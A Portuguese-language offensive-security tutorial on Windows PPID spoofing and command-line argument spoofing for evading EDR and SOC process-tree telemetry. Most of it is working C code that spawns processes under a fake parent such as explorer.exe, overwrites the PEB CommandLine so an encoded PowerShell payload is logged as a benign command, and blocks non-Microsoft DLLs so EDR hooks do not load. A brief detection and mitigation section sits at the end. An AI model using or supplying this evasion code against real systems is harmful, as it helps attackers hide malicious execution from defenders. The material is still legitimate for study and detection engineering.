---
title: "Process Spoofing"
---

# 13. Process Spoofing — PPID e Argumento

## Enganando a Process Tree do SOC

EDR e SOC investigam duas coisas no momento de criação de processo: process tree (cmd.exe spawnado por explorer.exe é normal; spawnado por winword.exe é macro malicioso) e command line (argumentos logados via Sysmon Event 1 e Microsoft-Windows-Security-Auditing 4688). Spoofing de PPID e argumento engana esses baselines de telemetria sem alterar o binário executado — alvo principal: passar batido em detection rules que olham parent-child relationship e em audit logs que dependem de CommandLine em texto.

---

## Mecânica de PPID e Argument Spoofing

### PPID Spoofing

Ao criar processo via `CreateProcess`, kernel registra `InheritedFromUniqueProcessId` = PID do processo criador. Defaults: cmd.exe spawnado por winword.exe terá PPID = winword.exe.

`UpdateProcThreadAttribute` com `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` permite especificar **processo arbitrário** como "parent" — kernel registra esse como PPID.

**Requisito**: handle com `PROCESS_CREATE_PROCESS` rights ao processo-pai falso. Não precisa ser elevated se for processo do mesmo user.

### Argument Spoofing

Argumentos ficam em `RTL_USER_PROCESS_PARAMETERS->CommandLine` (UNICODE_STRING) dentro do PEB do processo criado. Sysmon lê isso.

**Técnica**: criar processo SUSPENDED com argumento benigno, sobrescrever a string `CommandLine` no PEB com argumento real, resumir thread. Quando processo lê `GetCommandLine()`, vê argumento real (foi sobrescrito). Mas qualquer event logger que leu *antes* da sobrescrita vê benigno.

**Limitação**: ETW + Sysmon podem ler arg após process start. Race condition entre nosso resume e o logger. Mais robusto: nunca resumir e injetar diretamente.

---

## Na Prática

### 1. PPID Spoofing

```c
#include <windows.h>

BOOL SpawnWithFakeParent(LPSTR szCmdLine, DWORD dwFakeParentPid) {
    STARTUPINFOEXA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    SIZE_T attrSize = 0;

    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Calcular tamanho de attribute list
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

    // Abrir handle do parent falso
    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, dwFakeParentPid);
    if (!hParent) return FALSE;

    // Atribuir como parent
    UpdateProcThreadAttribute(
        si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE),
        NULL, NULL);

    BOOL ok = CreateProcessA(
        NULL, szCmdLine, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL, NULL,
        &si.StartupInfo, &pi);

    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    CloseHandle(hParent);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return ok;
}

int main() {
    // Encontrar PID do explorer.exe (legítimo, "trusted")
    DWORD dwExplorerPid = FindProcessIdByName("explorer.exe");

    // Spawn cmd.exe com explorer.exe como parent falso
    SpawnWithFakeParent("cmd.exe /c whoami", dwExplorerPid);
    // PPID logado pelo Sysmon = explorer.exe (não nosso processo)
}
```

**Uso operacional**: ofensiva spawna processos com `services.exe` (PID 4-ish) ou `winlogon.exe` como PPID para fingir Windows lifecycle process.

### 2. Argument Spoofing (CommandLine Patch)

```c
#include <winternl.h>

BOOL SpoofCommandLine(LPSTR szBenign, LPSTR szReal) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    // 1. Criar processo SUSPENDED com argumento benigno
    if (!CreateProcessA(NULL, szBenign, NULL, NULL, FALSE,
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return FALSE;
    }

    // 2. Ler PEB do alvo
    PROCESS_BASIC_INFORMATION pbi;
    NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation,
                              &pbi, sizeof(pbi), NULL);

    PEB peb;
    ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);

    RTL_USER_PROCESS_PARAMETERS params;
    ReadProcessMemory(pi.hProcess, peb.ProcessParameters,
                      &params, sizeof(params), NULL);

    // 3. Escrever string real em endereço já alocado da CommandLine
    WCHAR wszReal[256];
    int len = MultiByteToWideChar(CP_UTF8, 0, szReal, -1, wszReal, 256);

    WriteProcessMemory(pi.hProcess,
                       params.CommandLine.Buffer,
                       wszReal, len * sizeof(WCHAR), NULL);

    // 4. Atualizar Length para refletir nova string
    USHORT newLen = (USHORT)(len - 1) * sizeof(WCHAR);
    WriteProcessMemory(pi.hProcess,
                       (BYTE*)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine),
                       &newLen, sizeof(USHORT), NULL);

    // 5. Resumir thread
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

int main() {
    SpoofCommandLine(
        "powershell.exe -Command Get-Date",                      // logged
        "powershell.exe -Enc <base64-payload-aqui>"              // real
    );
}
```

**Caveat**: race entre Sysmon Event 1 (logado no process create kernel callback) e nosso patch. Se Sysmon ler CommandLine via `NtQueryInformationProcess(ProcessBasicInformation)` no callback, vai pegar valor real (PEB já tem). Patch precisa ocorrer **antes** do callback executar — o que é impossível em user-mode.

**Mais robusto**: patch o `ImagePathName` também para esconder qual binário foi lançado.

### 3. Combinando: PPID + Argument Spoofing

```c
// Pseudo-flow
spawn_with_attribute_list_AND_suspended_AND_fake_parent(
    cmd = "notepad.exe",  // arg benigno inicial
    fake_parent_pid = explorer_pid
);
patch_peb_commandline(new_pid, real_arg);
ResumeThread(/* ... */);
```

---

## Block DLL Policy + Spoofing

Combinar com `PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY` (PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON) — child process não pode carregar DLLs não-Microsoft (bloqueia EDR DLLs!).

```c
DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
UpdateProcThreadAttribute(
    si.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
    &policy, sizeof(policy), NULL, NULL);
```

Combo: spawnar `lsass.exe` clone com PPID spoofed + block DLL = EDR userland hook não carrega no child.

---

## Detecção

- **Sysmon Event 1** com PPID ≠ chain real (audit kernel-level via ETW Threat-Intelligence provider captura PPID real).
- **EDR sensor com kernel callback**: vê `PsCreateProcessNotifyRoutineEx` callback que tem PID real do criador (não confiável em user-mode spoof).
- **CommandLine race**: Sysmon Event 1 lê PEB *após* process started — captura valor real se patch foi lento.
- **Microsoft-Windows-Kernel-Audit-API-Calls** ETW: `OpenProcess(PROCESS_CREATE_PROCESS)` em processo non-child é forte sinal.

## Mitigação Defensiva

- ELAM driver para baseline de PPID legítimos.
- Audit `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` via ETW (Microsoft-Windows-Threat-Intelligence).
- Comparar `PsGetProcessInheritedFromUniqueProcessId` (kernel) vs `PEB->InheritedFromUniqueProcessId` (user).

## Leitura Complementar

- Didier Stevens — PPID spoofing original write-up (2017)
- MITRE ATT&CK T1134.004 — Parent PID Spoofing
- MITRE ATT&CK T1564.010 — Command Line Argument Spoofing
